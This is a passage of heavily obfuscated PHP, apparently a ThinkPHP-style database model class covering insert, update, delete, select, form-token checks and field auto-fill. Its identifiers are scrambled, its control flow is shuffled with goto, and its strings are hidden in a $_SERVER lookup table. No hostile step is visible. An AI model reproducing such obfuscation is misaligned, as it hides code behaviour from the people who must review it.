$B‚«šÆ¡‹ˆ), $dŠ£İñ–Æ); } } protected function call() { goto bÔÕë•ö¶‘; CğÌšÜŞ«ğ: $eÄ”µçÍ´ò = $b¼—¼Æí«; if (is_array($b¼—¼Æí«)) { $eÄ”µçÍ´ò = $b¼—¼Æí«[1]; $b¼—¼Æí« = $b¼—¼Æí«[0]; } $C±°½“— = count($CÀ÷ÈÉ¯¡‹) - 1; goto f»¤Ê«³Îœ; BËÚÈ ¢ÈÃ: $bœ†œ©…íä = call_user_func_array(array($this, $b¼—¼Æí«), $CÀ÷ÈÉ¯¡‹); if (method_exists($this, $Cî“ÃÑÇ»[264])) { $c›œîµÕ¦„ = call_user_func_array(array($this, $Cî“ÃÑÇ»[265]), array($eÄ”µçÍ´ò, $CÀ÷ÈÉ¯¡‹, $bœ†œ©…íä)); if ($c›œîµÕ¦„) { return $c›œîµÕ¦„; } } return $bœ†œ©…íä; goto A¸×ÂÆ¬ñ„; f»¤Ê«³Îœ: if (isset($CÀ÷ÈÉ¯¡‹[$C±°½“—]) && $CÀ÷ÈÉ¯¡‹[$C±°½“—] === $b¼—¼Æí«) { think_exception(__CLASS__ . $Cî“ÃÑÇ»[4] . $b¼—¼Æí« . think_lang($Cî“ÃÑÇ»[261])); return; } $CÀ÷ÈÉ¯¡‹[] = $b¼—¼Æí«; if (method_exists($this, $Cî“ÃÑÇ»[262])) { $c›œîµÕ¦„ = call_user_func_array(array($this, $Cî“ÃÑÇ»[263]), array($eÄ”µçÍ´ò, $CÀ÷ÈÉ¯¡‹)); if (!is_null($c›œîµÕ¦„) && $c›œîµÕ¦„ !== !1) { return $c›œîµÕ¦„; } } goto BËÚÈ ¢ÈÃ; bÔÕë•ö¶‘: $Cî“ÃÑÇ» =& $_SERVER[Æ¼ôºÙï]; $CÀ÷ÈÉ¯¡‹ = func_get_args(); $b¼—¼Æí« = array_shift($CÀ÷ÈÉ¯¡‹); goto CğÌšÜŞ«ğ; A¸×ÂÆ¬ñ„: } protected function _initialize() { } protected function _facade($fšèó‚—Âæ) { $Bò¼ÙËÚ =& $_SERVER[Æ¼ôºÙï]; if (!empty($this->fields)) { foreach ($fšèó‚—Âæ as $Cå…ŞœÀÎô => $C¸Ûµ‹‡Ç) { if (is_array($this->fields) && !in_array($Cå…ŞœÀÎô, $this->fields, !0)) { unset($fšèó‚—Âæ[$Cå…ŞœÀÎô]); } elseif (is_scalar($C¸Ûµ‹‡Ç)) { $this->_parseType($fšèó‚—Âæ, $Cå…ŞœÀÎô); } } } if (!empty($this->options[$Bò¼ÙËÚ[266]])) { $fšèó‚—Âæ = array_map($this->options[$Bò¼ÙËÚ[266]], $fšèó‚—Âæ); unset($this->options[$Bò¼ÙËÚ[266]]); } $this->_beforeWrite($fšèó‚—Âæ); return $fšèó‚—Âæ; } protected function _beforeWrite(&$FéøŸéÆÎà) { } public function add($dó„È–ƒ” = '', $FÔÇø”»© = array(), $f„«Á¤ĞˆÂ = false) { goto C‘‰”†îÀ»; Aœ“„ãÈ’ó: return $BÌ¡¢Ç°­Œ; goto BŒ‡‚áˆ; fé¸âÑ›–: if (!1 === $this->_beforeInsert($dó„È–ƒ”, $FÔÇø”»©)) { return !1; } $BÌ¡¢Ç°­Œ = $this->db->insert($dó„È–ƒ”, $FÔÇø”»©, $f„«Á¤ĞˆÂ); if (!1 !== $BÌ¡¢Ç°­Œ) { $FÄ‰¿‹Ã—Á = $this->getLastInsID(); if ($FÄ‰¿‹Ã—Á) { $dó„È–ƒ”[$this->getPk()] = $FÄ‰¿‹Ã—Á; $this->_after_insert($dó„È–ƒ”, $FÔÇø”»©); return $FÄ‰¿‹Ã—Á; } $this->_after_insert($dó„È–ƒ”, $FÔÇø”»©); } goto Aœ“„ãÈ’ó; C‘‰”†îÀ»: if (empty($dó„È–ƒ”)) { if (!empty($this->data)) { $dó„È–ƒ” = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Æ¼ôºÙï][267]); return !1; } } $FÔÇø”»© = $this->_parseOptions($FÔÇø”»©); $dó„È–ƒ” = $this->_facade($dó„È–ƒ”); goto fé¸âÑ›–; BŒ‡‚áˆ: } protected function _beforeInsert(&$d»©«ˆ§ˆ¥, $aÈñí¡‡ˆ) { } protected function _after_insert($eÃÈ‡½Àœİ, $c»íãˆ…±˜) { } public function addAll($c³ºøœ“õ, $E‚—¦®àä = array(), $A–õöéÕÆ‘ = false) { goto bÙ¤µŒÛ´; bÙ¤µŒÛ´: $EŒÍĞÅÀÀ® =& $_SERVER[Æ¼ôºÙï]; if (empty($c³ºøœ“õ)) { $this->error = think_lang($EŒÍĞÅÀÀ®[267]); return !1; } $E‚—¦®àä = $this->_parseOptions($E‚—¦®àä); goto a¦µ‡½Ü­; a¦µ‡½Ü­: foreach ($c³ºøœ“õ as $cç÷Â¾øĞ¿ => $a¨£Ù¹‚èŠ) { $c³ºøœ“õ[$cç÷Â¾øĞ¿] = $this->_facade($a¨£Ù¹‚èŠ); } if (method_exists($this->db, $EŒÍĞÅÀÀ®[268])) { $BÀõ×Ö¨Ò¹ = $this->db->insertAll($c³ºøœ“õ, $E‚—¦®àä, $A–õöéÕÆ‘); } else { $this->startTrans(); foreach ($c³ºøœ“õ as $cç÷Â¾øĞ¿ => $a¨£Ù¹‚èŠ) { $BÀõ×Ö¨Ò¹ = $this->db->insert($a¨£Ù¹‚èŠ, $E‚—¦®àä, $A–õöéÕÆ‘); } $this->commit(); } if (!1 !== $BÀõ×Ö¨Ò¹) { $e¹«î¼ÙéŞ = $this->getLastInsID(); if ($e¹«î¼ÙéŞ) { return $e¹«î¼ÙéŞ; } } goto A¡ô•ÌÁö; A¡ô•ÌÁö: return $BÀõ×Ö¨Ò¹; goto DÒ›«ËÕˆÊ; DÒ›«ËÕˆÊ: } public function selectAdd($F‰Ò†¢Ïšµ = '', $fˆŸ§¾ª¼« = '', $a”ƒöòè’ = array()) { $a“Çà©‡¨¸ =& $_SERVER[Æ¼ôºÙï]; $a”ƒöòè’ = $this->_parseOptions($a”ƒöòè’); if (!1 === ($E·åé™Ò® = $this->db->selectInsert($F‰Ò†¢Ïšµ ? $F‰Ò†¢Ïšµ : $a”ƒöòè’[$a“Çà©‡¨¸[269]], $fˆŸ§¾ª¼« ? $fˆŸ§¾ª¼« : $this->getTableName(), $a”ƒöòè’))) { $this->error = think_lang($a“Çà©‡¨¸[270]); return !1; } else { return $E·åé™Ò®; } } public function save($Fİ‡¥êâ»Œ = '', $D¥ˆÜÅƒ‡¬ = array()) { goto fùùÒä§Ì; fùùÒä§Ì: $Aª‹›‚ÅÆÊ =& $_SERVER[Æ¼ôºÙï]; if (empty($Fİ‡¥êâ»Œ)) { if (!empty($this->data)) { $Fİ‡¥êâ»Œ = $this->data; $this->data = array(); } else { $this->error = think_lang($Aª‹›‚ÅÆÊ[267]); return !1; } } $Fİ‡¥êâ»Œ = $this->_facade($Fİ‡¥êâ»Œ); goto BŒ»Í‹Ş‘; fÒ­éƒ“­Š: if (!1 !== $dÔ¸ÚÇ³¬±) { if (isset($Cš‡­‚Š÷)) { $Fİ‡¥êâ»Œ[$FßƒŠ§í¤] = $Cš‡­‚Š÷; } $this->_afterUpdate($Fİ‡¥êâ»Œ, $D¥ˆÜÅƒ‡¬); } return $dÔ¸ÚÇ³¬±; goto eØæºÕœ¥É; BŒ»Í‹Ş‘: $D¥ˆÜÅƒ‡¬ = $this->_parseOptions($D¥ˆÜÅƒ‡¬); $FßƒŠ§í¤ = $this->getPk(); if (!isset($D¥ˆÜÅƒ‡¬[$Aª‹›‚ÅÆÊ[271]])) { if (isset($Fİ‡¥êâ»Œ[$FßƒŠ§í¤])) { $eÅ·ĞøÜÇ[$FßƒŠ§í¤] = $Fİ‡¥êâ»Œ[$FßƒŠ§í¤]; $D¥ˆÜÅƒ‡¬[$Aª‹›‚ÅÆÊ[271]] = $eÅ·ĞøÜÇ; unset($Fİ‡¥êâ»Œ[$FßƒŠ§í¤]); } else { $this->error = think_lang($Aª‹›‚ÅÆÊ[270]); return !1; } } goto båˆñƒÚåÀ; båˆñƒÚåÀ: if (is_array($D¥ˆÜÅƒ‡¬[$Aª‹›‚ÅÆÊ[271]]) && isset($D¥ˆÜÅƒ‡¬[$Aª‹›‚ÅÆÊ[271]][$FßƒŠ§í¤])) { $Cš‡­‚Š÷ = $D¥ˆÜÅƒ‡¬[$Aª‹›‚ÅÆÊ[271]][$FßƒŠ§í¤]; } if (!1 === $this->_beforeUpdate($Fİ‡¥êâ»Œ, $D¥ˆÜÅƒ‡¬)) { return !1; } $dÔ¸ÚÇ³¬± = $this->db->update($Fİ‡¥êâ»Œ, $D¥ˆÜÅƒ‡¬); goto fÒ­éƒ“­Š; eØæºÕœ¥É: } protected function _beforeUpdate(&$fÖê×äÆÛò, $E££óœŞéµ) { } protected function _afterUpdate($EÎõŒ…Ç”Œ, $E¡™¢ïçœí) { } public function delete($DÃÁ¸Šé = array()) { goto aÍ˜ŞïÌˆ; cíµîê¤ó†: if (is_numeric($DÃÁ¸Šé) || is_string($DÃÁ¸Šé)) { if (strpos($DÃÁ¸Šé, $Eªğ•Ø«›[47])) { $E¾à¿ÅåÕ÷[$fëñ…µ›ŞÅ] = array($Eªğ•Ø«›[272], $DÃÁ¸Šé); } else { $E¾à¿ÅåÕ÷[$fëñ…µ›ŞÅ] = $DÃÁ¸Šé; } $this->options[$Eªğ•Ø«›[271]] = $E¾à¿ÅåÕ÷; } $DÃÁ¸Šé = $this->_parseOptions(); if (is_array($DÃÁ¸Šé[$Eªğ•Ø«›[271]]) && isset($DÃÁ¸Šé[$Eªğ•Ø«›[271]][$fëñ…µ›ŞÅ])) { $A¯…óˆ÷Ø† = $DÃÁ¸Šé[$Eªğ•Ø«›[271]][$fëñ…µ›ŞÅ]; } goto E¿‰ˆÃå„Ô; aÍ˜ŞïÌˆ: $Eªğ•Ø«› =& $_SERVER[Æ¼ôºÙï]; if (empty($DÃÁ¸Šé) && empty($this->options[$Eªğ•Ø«›[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $fëñ…µ›ŞÅ = $this->getPk(); goto cíµîê¤ó†; E¿‰ˆÃå„Ô: $aÑø¤’Ÿ½ = $this->db->delete($DÃÁ¸Šé); if (!1 !== $aÑø¤’Ÿ½) { $f‘™‡¶ˆ“ = array(); if (isset($A¯…óˆ÷Ø†)) { $f‘™‡¶ˆ“[$fëñ…µ›ŞÅ] = $A¯…óˆ÷Ø†; } $this->_after_delete($f‘™‡¶ˆ“, $DÃÁ¸Šé); } return $aÑø¤’Ÿ½; goto BµŠÖÍƒáŞ; BµŠÖÍƒáŞ: } protected function _after_delete($c»¥§Í–Ä, $DÜà—µï) { } public function select($EØ­¡ˆè†Û = array()) { goto f«ßÆ‹Œ; f«ßÆ‹Œ: $B°â„é·… =& $_SERVER[Æ¼ôºÙï]; if (is_string($EØ­¡ˆè†Û) || is_numeric($EØ­¡ˆè†Û)) { $c©¯Œ„Ç† = $this->getPk(); if (strpos($EØ­¡ˆè†Û, $B°â„é·…[47])) { $DËµÒ¦ËÍ‰[$c©¯Œ„Ç†] = array($B°â„é·…[272], $EØ­¡ˆè†Û); } else { $DËµÒ¦ËÍ‰[$c©¯Œ„Ç†] = $EØ­¡ˆè†Û; } $this->options[$B°â„é·…[271]] = $DËµÒ¦ËÍ‰; } elseif (!1 === $EØ­¡ˆè†Û) { $EØ­¡ˆè†Û = $this->_parseOptions(); return $B°â„é·…[273] . $this->db->buildSelectSql($EØ­¡ˆè†Û) . $B°â„é·…[274]; } $EØ­¡ˆè†Û = $this->_parseOptions(); goto fÉÁ˜Ú·Îå; fÉÁ˜Ú·Îå: $cÛ‰Æ„¶ğè = $this->db->select($EØ­¡ˆè†Û); if (!1 === $cÛ‰Æ„¶ğè) { return !1; } if (empty($cÛ‰Æ„¶ğè)) { return null; } goto E‰¸çˆ´¯; E‰¸çˆ´¯: $this->_afterSelect($cÛ‰Æ„¶ğè, $EØ­¡ˆè†Û); return $cÛ‰Æ„¶ğè; goto d„×æÍÅì; d„×æÍÅì: } protected function _afterSelect(&$F¤ÖÙåŠİ„, $Aºé”Ì‘ô) { } public function buildSql($BÚÌ÷¢òö‰ = array()) { $E‘¡àŞŠŸ =& $_SERVER[Æ¼ôºÙï]; $BÚÌ÷¢òö‰ = $this->_parseOptions($BÚÌ÷¢òö‰); return $E‘¡àŞŠŸ[273] . $this->db->buildSelectSql($BÚÌ÷¢òö‰) . $E‘¡àŞŠŸ[274]; } public function optionsValue($aìå‡İ·–ƒ = null) { if (is_null($aìå‡İ·–ƒ)) { return $this->options; } elseif (is_array($aìå‡İ·–ƒ)) { $this->options = array_merge($this->options, $aìå‡İ·–ƒ); } } protected function _parseOptions($Eêß¬ù†İÆ = array()) { goto EÓèœ˜…ô; EÓèœ˜…ô: $BÌöˆœë® =& $_SERVER[Æ¼ôºÙï]; if (is_array($Eêß¬ù†İÆ)) { $Eêß¬ù†İÆ = array_merge($this->options, $Eêß¬ù†İÆ); } $this->options = array(); goto c¦‹º‰©éã; c¦‹º‰©éã: if (!isset($Eêß¬ù†İÆ[$BÌöˆœë®[275]])) { $Eêß¬ù†İÆ[$BÌöˆœë®[275]] = $this->getTableName(); $aÄ¸‹ôõ¶ = $this->fields; } else { $aÄ¸‹ôõ¶ = $this->getDbFields(); } if (!empty($Eêß¬ù†İÆ[$BÌöˆœë®[276]])) { $Eêß¬ù†İÆ[$BÌöˆœë®[275]] .= $BÌöˆœë®[50] . $Eêß¬ù†İÆ[$BÌöˆœë®[276]]; } $Eêß¬ù†İÆ[$BÌöˆœë®[277]] = $this->name; goto EŠòùõÈç­; EŠòùõÈç­: if (isset($Eêß¬ù†İÆ[$BÌöˆœë®[271]]) && is_array($Eêß¬ù†İÆ[$BÌöˆœë®[271]]) && !empty($aÄ¸‹ôõ¶) && !isset($Eêß¬ù†İÆ[$BÌöˆœë®[278]]) && !isset($Eêß¬ù†İÆ[$BÌöˆœë®[275]])) { foreach ($Eêß¬ù†İÆ[$BÌöˆœë®[271]] as $f‘Ò°‚Ìå => $cßÍí±¹») { $f‘Ò°‚Ìå = trim($f‘Ò°‚Ìå); if (in_array($f‘Ò°‚Ìå, $aÄ¸‹ôõ¶, !0)) { if (is_scalar($cßÍí±¹»)) { $this->_parseType($Eêß¬ù†İÆ[$BÌöˆœë®[271]], $f‘Ò°‚Ìå); } } elseif (!is_numeric($f‘Ò°‚Ìå) && $BÌöˆœë®[70] != substr($f‘Ò°‚Ìå, 0, 1) && !1 === strpos($f‘Ò°‚Ìå, $BÌöˆœë®[94]) && !1 === strpos($f‘Ò°‚Ìå, $BÌöˆœë®[256]) && !1 === strpos($f‘Ò°‚Ìå, $BÌöˆœë®[279]) && !1 === strpos($f‘Ò°‚Ìå, $BÌöˆœë®[280])) { unset($Eêß¬ù†İÆ[$BÌöˆœë®[271]][$f‘Ò°‚Ìå]); } } } $this->_options_filter($Eêß¬ù†İÆ); return $Eêß¬ù†İÆ; goto D…àƒìˆßÅ; D…àƒìˆßÅ: } protected function _options_filter(&$Eà¼äİÌ ) { } protected function _parseType(&$DÜêŒää¼Ä, $aªÚŒËçÕˆ) { $c ¸¬ÜÚç =& $_SERVER[Æ¼ôºÙï]; if (empty($this->options[$c ¸¬ÜÚç[281]][$c ¸¬ÜÚç[4] . $aªÚŒËçÕˆ])) { $dÕ˜İÉ’Ÿœ = strtolower($this->fields[$c ¸¬ÜÚç[248]][$aªÚŒËçÕˆ]); if (!1 !== strpos($dÕ˜İÉ’Ÿœ, $c ¸¬ÜÚç[282])) { } elseif (!1 === strpos($dÕ˜İÉ’Ÿœ, $c ¸¬ÜÚç[283]) && !1 !== strpos($dÕ˜İÉ’Ÿœ, $c ¸¬ÜÚç[284])) { $DÜêŒää¼Ä[$aªÚŒËçÕˆ] = intval($DÜêŒää¼Ä[$aªÚŒËçÕˆ]); } elseif (!1 !== strpos($dÕ˜İÉ’Ÿœ, $c ¸¬ÜÚç[285]) || !1 !== strpos($dÕ˜İÉ’Ÿœ, $c ¸¬ÜÚç[286])) { $DÜêŒää¼Ä[$aªÚŒËçÕˆ] = floatval($DÜêŒää¼Ä[$aªÚŒËçÕˆ]); } elseif (!1 !== strpos($dÕ˜İÉ’Ÿœ, $c ¸¬ÜÚç[287])) { $DÜêŒää¼Ä[$aªÚŒËçÕˆ] = (bool) $DÜêŒää¼Ä[$aªÚŒËçÕˆ]; } } } public function find($f«‰æŸá³ = array()) { goto B½´ˆ‹É; B½´ˆ‹É: $E´Ê…ª›Øœ =& $_SERVER[Æ¼ôºÙï]; if (is_numeric($f«‰æŸá³) || is_string($f«‰æŸá³)) { $c±èŠšÎ¹[$this->getPk()] = intval($f«‰æŸá³); $this->options[$E´Ê…ª›Øœ[271]] = $c±èŠšÎ¹; } $this->options[$E´Ê…ª›Øœ[288]] = 1; goto fÒæù†óê’; fÒæù†óê’: $f«‰æŸá³ = $this->_parseOptions(); $a­²Ğİ½« = $this->db->select($f«‰æŸá³); if (!1 === $a­²Ğİ½«) { return !1; } goto a¬ßÎÍˆÖ; a¬ßÎÍˆÖ: if (empty($a­²Ğİ½«)) { return null; } $this->data = $a­²Ğİ½«[0]; $this->_afterFind($this->data, $f«‰æŸá³); goto DÅšõà®™; DÅšõà®™: if (!empty($this->options[$E´Ê…ª›Øœ[289]])) { return $this->returnResult($this->data, $this->options[$E´Ê…ª›Øœ[289]]); } return $this->data; goto E‰¢Şøˆ; E‰¢Şøˆ: } protected function _afterFind(&$b×ï‡ÕÁ§, $CãŠÚ²„İ) { } protected function returnResult($dŸİç½î»¢, $E¬½Çõ¦¨Å = '') { $F‘½ÍÃĞÓÚ =& $_SERVER[Æ¼ôºÙï]; if ($E¬½Çõ¦¨Å) { if (is_callable($E¬½Çõ¦¨Å)) { return call_user_func($E¬½Çõ¦¨Å, $dŸİç½î»¢); } switch (strtolower($E¬½Çõ¦¨Å)) { case $F‘½ÍÃĞÓÚ[290]: return json_encode($dŸİç½î»¢); case $F‘½ÍÃĞÓÚ[291]: return xml_encode($dŸİç½î»¢); } } return $dŸİç½î»¢; } public function parseFieldsMap($f¨ªÕ£…ŞĞ, $Fé”åà»ÜÛ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c÷¦¹ãñ¹Í => $d³ê‚Ë¢”) { if ($Fé”åà»ÜÛ == 1) { if (isset($f¨ªÕ£…ŞĞ[$d³ê‚Ë¢”])) { $f¨ªÕ£…ŞĞ[$c÷¦¹ãñ¹Í] = $f¨ªÕ£…ŞĞ[$d³ê‚Ë¢”]; unset($f¨ªÕ£…ŞĞ[$d³ê‚Ë¢”]); } } else { if (isset($f¨ªÕ£…ŞĞ[$c÷¦¹ãñ¹Í])) { $f¨ªÕ£…ŞĞ[$d³ê‚Ë¢”] = $f¨ªÕ£…ŞĞ[$c÷¦¹ãñ¹Í]; unset($f¨ªÕ£…ŞĞ[$c÷¦¹ãñ¹Í]); } } } } return $f¨ªÕ£…ŞĞ; } public function setField($Bçô ¨†å, $Fµ¢ÈÜª¥¼ = '') { if (is_array($Bçô ¨†å)) { $A‰Ê×Ü¥É = $Bçô ¨†å; } else { $A‰Ê×Ü¥É[$Bçô ¨†å] = $Fµ¢ÈÜª¥¼; } return $this->save($A‰Ê×Ü¥É); } public function setAdd($CÎß¤Ò¾Ÿ°, $b×Æè«ƒÇß = 1) { $Dä°÷Üäóè =& $_SERVER[Æ¼ôºÙï]; $cˆâæŸ´£Î = $CÎß¤Ò¾Ÿ° . $Dä°÷Üäóè[292] . $b×Æè«ƒÇß; if ($b×Æè«ƒÇß < 0) { $cˆâæŸ´£Î = $CÎß¤Ò¾Ÿ° . $b×Æè«ƒÇß; } return $this->setField($CÎß¤Ò¾Ÿ°, array($Dä°÷Üäóè[293], $cˆâæŸ´£Î)); } public function getField($CÌ…£„öö±, $FåË…”…‰‰ = null) { $BŒêòƒ¸Îê =& $_SERVER[Æ¼ôºÙï]; $dÆ¸òÇ‘ñ[$BŒêòƒ¸Îê[269]] = $CÌ…£„öö±; $dÆ¸òÇ‘ñ = $this->_parseOptions($dÆ¸òÇ‘ñ); $CÌ…£„öö± = trim($CÌ…£„öö±); if (strpos($CÌ…£„öö±, $BŒêòƒ¸Îê[47])) { if (!isset($dÆ¸òÇ‘ñ[$BŒêòƒ¸Îê[288]])) { $dÆ¸òÇ‘ñ[$BŒêòƒ¸Îê[288]] = is_numeric($FåË…”…‰‰) ? $FåË…”…‰‰ : $BŒêòƒ¸Îê[33]; } $B¨ëï‚·Ñ¡ = $this->db->select($dÆ¸òÇ‘ñ); if (!empty($B¨ëï‚·Ñ¡)) { goto fè×Ë‘©Ø; f¸Û´ÈËç: $aëˆù’ÛË = array_shift($CÌ…£„öö±); $b¹‡ø º§ê = array(); $fÚ°ÛÜ‘±÷ = count($e©ÃøØ‡’µ); goto aÀÛ‚ì¡™; aÀÛ‚ì¡™: foreach ($B¨ëï‚·Ñ¡ as $C¢Ó„Å«¯“) { $AÄ§Ÿ†‘† = $C¢Ó„Å«¯“[$F¥†ŠË­¡ù]; if (2 == $fÚ°ÛÜ‘±÷) { $b¹‡ø º§ê[$AÄ§Ÿ†‘†] = $C¢Ó„Å«¯“[$aëˆù’ÛË]; } else { $b¹‡ø º§ê[$AÄ§Ÿ†‘†] = is_string($FåË…”…‰‰) ? implode($FåË…”…‰‰, $C¢Ó„Å«¯“) : $C¢Ó„Å«¯“; } } return $b¹‡ø º§ê; goto aŒ¯‡èë÷‘; fè×Ë‘©Ø: $e©ÃøØ‡’µ = explode($BŒêòƒ¸Îê[47], $CÌ…£„öö±); $CÌ…£„öö± = array_keys($B¨ëï‚·Ñ¡[0]); $F¥†ŠË­¡ù = array_shift($CÌ…£„öö±); goto f¸Û´ÈËç; aŒ¯‡èë÷‘: } } else { if (!0 !== $FåË…”…‰‰) { $dÆ¸òÇ‘ñ[$BŒêòƒ¸Îê[288]] = is_numeric($FåË…”…‰‰) ? $FåË…”…‰‰ : 1; } if ($FåË…”…‰‰ === $BŒêòƒ¸Îê[251]) { unset($dÆ¸òÇ‘ñ[$BŒêòƒ¸Îê[288]]); } $C¢Ó„Å«¯“ = $this->db->select($dÆ¸òÇ‘ñ); if (!empty($C¢Ó„Å«¯“)) { if ($FåË…”…‰‰ === $BŒêòƒ¸Îê[251]) { return reset($C¢Ó„Å«¯“[0]); } if (!0 !== $FåË…”…‰‰ && 1 == $dÆ¸òÇ‘ñ[$BŒêòƒ¸Îê[288]]) { return reset($C¢Ó„Å«¯“[0]); } foreach ($C¢Ó„Å«¯“ as $féé‰ô¿Ã™) { $c¶»Õµ¦øÏ[] = $féé‰ô¿Ã™[$CÌ…£„öö±]; } return $c¶»Õµ¦øÏ; } } return null; } public function create($A¦â±™ƒù = '', $e®¸‚¹ÔÜï = '') { goto C ‘Üá¦®²; FµœÌğ»‡‡: if (isset($bÇ†„Õ´Øª)) { if (is_string($bÇ†„Õ´Øª)) { $bÇ†„Õ´Øª = explode($bÕ©•ÙŒ„Ê[47], $bÇ†„Õ´Øª); } if (think_config($bÕ©•ÙŒ„Ê[294])) { $bÇ†„Õ´Øª[] = think_config($bÕ©•ÙŒ„Ê[295]); } foreach ($A¦â±™ƒù as $f¾ÍÑÍî¢ => $bĞ‹ßÂ—ø) { if (!in_array($f¾ÍÑÍî¢, $bÇ†„Õ´Øª)) { unset($A¦â±™ƒù[$f¾ÍÑÍî¢]); } } } if (!$this->autoValidation($A¦â±™ƒù, $e®¸‚¹ÔÜï)) { return !1; } if (!$this->autoCheckToken($A¦â±™ƒù)) { $this->error = think_lang($bÕ©•ÙŒ„Ê[296]); return !1; } goto dÁ±ñçªÁÈ; Càí¸æ‚º: return $A¦â±™ƒù; goto f„ßœÊÆ; C ‘Üá¦®²: $bÕ©•ÙŒ„Ê =& $_SERVER[Æ¼ôºÙï]; if (empty($A¦â±™ƒù)) { $A¦â±™ƒù = $_POST; } elseif (is_object($A¦â±™ƒù)) { $A¦â±™ƒù = get_object_vars($A¦â±™ƒù); } if (empty($A¦â±™ƒù) || !is_array($A¦â±™ƒù)) { $this->error = think_lang($bÕ©•ÙŒ„Ê[267]); return !1; } goto Dç­®®¯£ò; Dç­®®¯£ò: $A¦â±™ƒù = $this->parseFieldsMap($A¦â±™ƒù, 0); $e®¸‚¹ÔÜï = $e®¸‚¹ÔÜï ? $e®¸‚¹ÔÜï : (!empty($A¦â±™ƒù[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bÕ©•ÙŒ„Ê[269]])) { $bÇ†„Õ´Øª = $this->options[$bÕ©•ÙŒ„Ê[269]]; unset($this->options[$bÕ©•ÙŒ„Ê[269]]); } elseif ($e®¸‚¹ÔÜï == THINK_MODEL_INSERT && isset($this->insertFields)) { $bÇ†„Õ´Øª = $this->insertFields; } elseif ($e®¸‚¹ÔÜï == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bÇ†„Õ´Øª = $this->updateFields; } goto FµœÌğ»‡‡; dÁ±ñçªÁÈ: if ($this->autoCheckFields) { $bÇ†„Õ´Øª = $this->getDbFields(); foreach ($A¦â±™ƒù as $f¾ÍÑÍî¢ => $bĞ‹ßÂ—ø) { if (!in_array($f¾ÍÑÍî¢, $bÇ†„Õ´Øª)) { unset($A¦â±™ƒù[$f¾ÍÑÍî¢]); } elseif (MAGIC_QUOTES_GPC && is_string($bĞ‹ßÂ—ø)) { $A¦â±™ƒù[$f¾ÍÑÍî¢] = stripslashes($bĞ‹ßÂ—ø); } } } $this->autoOperation($A¦â±™ƒù, $e®¸‚¹ÔÜï); $this->data = $A¦â±™ƒù; goto Càí¸æ‚º; f„ßœÊÆ: } public function autoCheckToken($fµåù“¨Ó¶) { $Dàƒø¥•‚ =& $_SERVER[Æ¼ôºÙï]; if (isset($this->options[$Dàƒø¥•‚[297]]) && !$this->options[$Dàƒø¥•‚[297]]) { return !0; } if (think_config($Dàƒø¥•‚[294])) { $bíŠîÒÁö = think_config($Dàƒø¥•‚[295]); if (!isset($fµåù“¨Ó¶[$bíŠîÒÁö]) || Session::get($bíŠîÒÁö)) { return !1; } list($CÅª¿ÌÏ×, $fšÒùÒ®) = explode($Dàƒø¥•‚[70], $fµåù“¨Ó¶[$bíŠîÒÁö]); if ($fšÒùÒ® && Session::get($bíŠîÒÁö . $Dàƒø¥•‚[94] . $CÅª¿ÌÏ×) === $fšÒùÒ®) { Session::remove($bíŠîÒÁö . $Dàƒø¥•‚[94] . $CÅª¿ÌÏ×); return !0; } if (think_config($Dàƒø¥•‚[298])) { Session::remove($bíŠîÒÁö . $Dàƒø¥•‚[94] . $CÅª¿ÌÏ×); } return !1; } return !0; } public function regex($EÇÜ‚ğŸé¹, $B¹èºÌÁÏÉ) { $dÀ–¹¸È‘È =& $_SERVER[Æ¼ôºÙï]; $cöÎ‰¹òË¨ = array($dÀ–¹¸È‘È[299] => $dÀ–¹¸È‘È[300], $dÀ–¹¸È‘È[301] => $dÀ–¹¸È‘È[302], $dÀ–¹¸È‘È[303] => $dÀ–¹¸È‘È[304], $dÀ–¹¸È‘È[305] => $dÀ–¹¸È‘È[306], $dÀ–¹¸È‘È[307] => $dÀ–¹¸È‘È[308], $dÀ–¹¸È‘È[309] => $dÀ–¹¸È‘È[310], $dÀ–¹¸È‘È[311] => $dÀ–¹¸È‘È[312], $dÀ–¹¸È‘È[286] => $dÀ–¹¸È‘È[313], $dÀ–¹¸È‘È[314] => $dÀ–¹¸È‘È[315]); if (isset($cöÎ‰¹òË¨[strtolower($B¹èºÌÁÏÉ)])) { $B¹èºÌÁÏÉ = $cöÎ‰¹òË¨[strtolower($B¹èºÌÁÏÉ)]; } return preg_match($B¹èºÌÁÏÉ, $EÇÜ‚ğŸé¹) === 1; } private function autoOperation(&$F±Ù¿¨ª, $cÓãÏ‡¾½Â) { $F£¿ÑöâÚø =& $_SERVER[Æ¼ôºÙï]; if (!empty($this->options[$F£¿ÑöâÚø[316]])) { $dÈõÀ†Ô–Œ = $this->options[$F£¿ÑöâÚø[316]]; unset($this->options[$F£¿ÑöâÚø[316]]); } elseif (!empty($this->_auto)) { $dÈõÀ†Ô–Œ = $this->_auto; } if (isset($dÈõÀ†Ô–Œ)) { foreach ($dÈõÀ†Ô–Œ as $EùíÎ¹“ç·) { if (empty($EùíÎ¹“ç·[2])) { $EùíÎ¹“ç·[2] = THINK_MODEL_INSERT; } if ($cÓãÏ‡¾½Â == $EùíÎ¹“ç·[2] || $EùíÎ¹“ç·[2] == THINK_MODEL_BOTH) { switch (trim($EùíÎ¹“ç·[3])) { case $F£¿ÑöâÚø[317]: case $F£¿ÑöâÚø[318]: $dŞ„áš¢ë = isset($EùíÎ¹“ç·[4]) ? (array) $EùíÎ¹“ç·[4] : array(); if (isset($F±Ù¿¨ª[$EùíÎ¹“ç·[0]])) { array_unshift($dŞ„áš¢ë, $F±Ù¿¨ª[$EùíÎ¹“ç·[0]]); } if ($F£¿ÑöâÚø[317] == $EùíÎ¹“ç·[3]) { $F±Ù¿¨ª[$EùíÎ¹“ç·[0]] = call_user_func_array($EùíÎ¹“ç·[1], $dŞ„áš¢ë); } else { $F±Ù¿¨ª[$EùíÎ¹“ç·[0]] = call_user_func_array(array(&$this, $EùíÎ¹“ç·[1]), $dŞ„áš¢ë); } break; case $F£¿ÑöâÚø[269]: $F±Ù¿¨ª[$EùíÎ¹“ç·[0]] = $F±Ù¿¨ª[$EùíÎ¹“ç·[1]]; break; case $F£¿ÑöâÚø[319]: if ($F£¿ÑöâÚø[33] === $F±Ù¿¨ª[$EùíÎ¹“ç·[0]]) { unset($F±Ù¿¨ª[$EùíÎ¹“ç·[0]]); } break; case 